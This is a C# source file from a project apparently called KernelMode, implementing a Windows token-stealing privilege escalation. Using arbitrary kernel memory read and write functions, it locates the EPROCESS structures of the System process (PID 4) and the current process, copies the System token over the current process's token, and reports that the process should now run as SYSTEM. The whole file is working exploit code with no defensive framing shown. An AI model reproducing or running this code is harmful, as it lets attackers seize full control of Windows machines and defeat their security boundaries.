// File: Privilege/TokenManipulator.cs
// Project: KernelMode

using KernelMode.Providers;
using KernelMode.Utils;
using System;
using System.Diagnostics;

namespace KernelMode.Privilege
{
	public static class TokenManipulator
	{
		public static void StealSystemToken()
		{
			if (!KernelMemory.IsReady)
			{
				Console.WriteLine("[-] KernelMemory not initialized.");
				return;
			}

			IProvider provider = KernelMemory.GetProvider();
			if (provider == null)
			{
				Console.WriteLine("[-] No provider set in KernelMemory.");
				return;
			}

			int tokenOffset = OffsetResolver.GetTokenOffset();
			if (tokenOffset < 0)
			{
				Console.WriteLine("[-] Invalid token offset.");
				return;
			}

			ulong systemEproc = EprocessScanner.FindEprocessByPid(provider, 4);
			ulong currentEproc = EprocessScanner.FindEprocessByPid(provider, Process.GetCurrentProcess().Id);

			if (systemEproc == 0 || currentEproc == 0)
			{
				Console.WriteLine("[-] Failed to locate one or both EPROCESS structures.");
				return;
			}

			ulong systemToken = KernelMemory.ReadQword(systemEproc + (ulong)tokenOffset);
			Console.WriteLine($"[+] System token: 0x{systemToken:X}");

			bool success = KernelMemory.WriteQword(currentEproc + (ulong)tokenOffset, systemToken);
			Console.WriteLine(success
				? "[+] Token stolen — current process should now be SYSTEM."
				: "[-] Failed to write token.");
		}

	}
}
